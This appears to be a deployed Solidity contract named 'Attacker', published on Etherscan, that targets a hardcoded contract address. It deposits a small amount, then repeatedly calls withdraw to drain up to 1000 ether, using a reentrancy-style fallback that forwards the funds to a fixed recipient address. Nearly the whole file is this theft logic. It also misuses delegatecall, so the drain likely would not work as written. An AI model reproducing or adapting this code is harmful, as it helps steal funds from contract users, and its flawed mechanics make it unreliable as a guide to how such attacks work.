/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IVulnerable public vulnerableContract;
    uint256 public withdrawalAmount = 1000 ether;
    uint256 public numWithdrawals = 1;
    address payable public recipient;
    
    event ReceivedEther(address sender, uint amount);

    constructor() {
        vulnerableContract = IVulnerable(0x8484Ef722627bf18ca5Ae6BcF031c23E6e922B30); // Vulnerable contract address
        recipient = payable(0xEa7DDfE2b4D4Db4Ab9Df681347871A47EF452c3F); // Recipient address where funds will be sent
    }

    function attack() public payable {
        require(msg.value == 0.00025 ether, "Invalid amount");

        vulnerableContract.deposit{value: msg.value}();

        (bool success, ) = address(vulnerableContract).delegatecall(
            abi.encodeWithSignature("withdraw(uint256)", withdrawalAmount)
        );

        require(success, "Withdrawal failed");
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= msg.value) {
            (bool success, ) = address(vulnerableContract).delegatecall(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );

            require(success, "Withdrawal failed");

            recipient.transfer(msg.value);
        }
    }

    receive() external payable {
        emit ReceivedEther(msg.sender, msg.value);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}